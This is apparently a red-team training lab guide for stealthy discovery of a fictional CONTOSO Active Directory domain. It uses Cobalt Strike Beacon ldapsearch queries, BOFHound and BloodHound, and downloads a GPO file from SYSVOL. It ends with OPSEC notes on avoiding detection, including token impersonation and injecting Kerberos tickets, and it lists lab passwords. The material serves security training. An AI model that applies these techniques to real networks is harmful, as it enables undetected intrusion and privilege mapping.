# Discovery Lab  

>The objective of this lab is to carry out discovery of the CONTOSO domain.  By the end, you will be able to collect data and map attack paths in BloodHound, in a more stealth OPSEC-safe way than using the default collectors that will be detected.

## BOFHound

1. Launch Cobalt Strike and connect to the team server.
2. Interact with the Beacon.
3. Enumerate the domain, users, groups, OUs, and GPOs.

    ```Beacon-nocolor
    ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor
    ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor
    ```

1. Copy the raw Beacon logs to the Attacker Desktop.
  1. From the Windows Terminal, open a tab for Ubuntu.
  2. `cd /mnt/c/Users/Attacker/Desktop`
  3. `scp -r attacker@10.0.0.5:/opt/cobaltstrike/logs .`
  4. The password is `Passw0rd!`.

1. Parse the logs with BOFHound
  1. `bofhound -i logs`

===

## BloodHound

1. Run BloodHound.
  1. From the Start Menu, open Docker Desktop.
  1. Click the **Containers** link on the left-hand side.
  1. Start all the containers by clicking the 'play' button, and wait for them to start.
  1. From the taskbar, open Microsoft Edge.
  1. Click the BloodHound shortcut in the favourites bar, or manually browse to `http://localhost:8080/ui/login`
  1. The browser should autofil the credentials.  If not, use `admin` : `eA%N4frBrnn2`.

⚠️ You'll likely be prompted to set a new password. You can change it to anything you want.

1. Ingest the BOFHound data.
  1. After first login, click the 'start by uploading your data' link.
  1. On the new page, click the 'Upload File(s)' button and select the JSON files produced by BOFHound.

⚠️ They will be in *C:\\Users\\Attacker\\Desktop\\*.

  1. Wait until the status reaches 'Complete'.

1. Click the **Explore** link in the left-hand menu.
1. Select the Cypher query search box.
1. Using the following cypher query, search for GPOs in BloodHound:
  1. `Match (n:GPO) return n`
  1. Click **Run**.

1. Select the 'Workstation Admins' GPO.
  1. Take note of its Gpcpath.
  1. Expand its 'Affected Objects' and select 'Computers'.

1. Select each computer and note their Obiect ID.

===

## Restricted Groups Data

1. Using the gpcpath for the Workstations Admins GPO, download its **GptTmpl.inf** file using Beacon.

    ```Beacon-nocolor
    ls \\contoso.com\SysVol\contoso.com\Policies\{2583E34A-BBCE-4061-9972-E2ADAB399BB4}\Machine\Microsoft\Windows NT\SecEdit\
    download \\contoso.com\SysVol\contoso.com\Policies\{2583E34A-BBCE-4061-9972-E2ADAB399BB4}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
    ```
1. Sync the file to your Attacker Desktop.

⚠️ View > Downloads.

1. Open the file in Notepad (or VSCode).
  1. Note the SID of the domain group.

1. Add the custom edges in BloodHound.

    ```Cypher
    MATCH (x:Computer{objectid:'S-1-5-21-3926355307-1661546229-813047887-2101'})
    MATCH (y:Group{objectid:'S-1-5-21-3926355307-1661546229-813047887-1106'})
    MERGE (y)-[:AdminTo]->(x)
    ```
    ```Cypher
    MATCH (x:Computer{objectid:'S-1-5-21-3926355307-1661546229-813047887-2102'})
    MATCH (y:Group{objectid:'S-1-5-21-3926355307-1661546229-813047887-1106'})
    MERGE (y)-[:AdminTo]->(x)
    ```

BloodHound will now show that rsteel has local administrative privileges on WKSTN-1 and 2.

⚠️ In this lab, you have used LDAP queries and BloodHound to map part of the CONTOSO domain.

---

## OPSEC Warnings & Exam-Day Notes

### ldapsearch Returns 0 Results — WinRM Token Limitation

`ldapsearch` binds to the DC using the beacon's current Kerberos token. A beacon landed via
`jump winrm64` has a **Type 3 network logon token** — it is non-forwardable and does not carry
Kerberos credentials for onward connections to the DC.

**Symptom:**
```
Binding to 10.10.120.1
retrieved 0 results total
```

**Fix — establish a proper Kerberos token before running ldapsearch:**

```cs
// Option 1 — make_token with known creds (OPSEC-🟠CAUTION — Event 4648)
beacon> make_token CONTOSO\rsteel <password>
beacon> ldapsearch (samAccountType=805306369) --attributes name,dnsHostName,operatingSystem

// Option 2 — inject a TGT (OPSEC-🟢SAFE — no new logon event)
beacon> kerberos_ticket_use C:\path\to\rsteel.kirbi
beacon> ldapsearch (samAccountType=805306369) --attributes name,dnsHostName,operatingSystem
```

> This affects **any** beacon that arrived via WinRM, SCShell, or WMI — all produce
> non-forwardable network logon tokens. Only beacons from interactive sessions or `make_token`
> / `kerberos_ticket_use` have usable Kerberos context for LDAP queries.

---

### `net computers` — Never Use

`net computers` (and all `net *` beacon commands) run via the `shell` built-in which spawns
`cmd.exe` — OPSEC-🔴UNSAFE. It also fails with Error 5 from a network logon token.

| Command | OPSEC | Replacement |
|---------|-------|-------------|
| `net computers` | 🔴UNSAFE — spawns cmd.exe | `ldapsearch (samAccountType=805306369)` |
| `net users` | 🔴UNSAFE — spawns cmd.exe | `ldapsearch (samAccountType=805306368)` |
| `net groups` | 🔴UNSAFE — spawns cmd.exe | `ldapsearch (samAccountType=268435456)` |
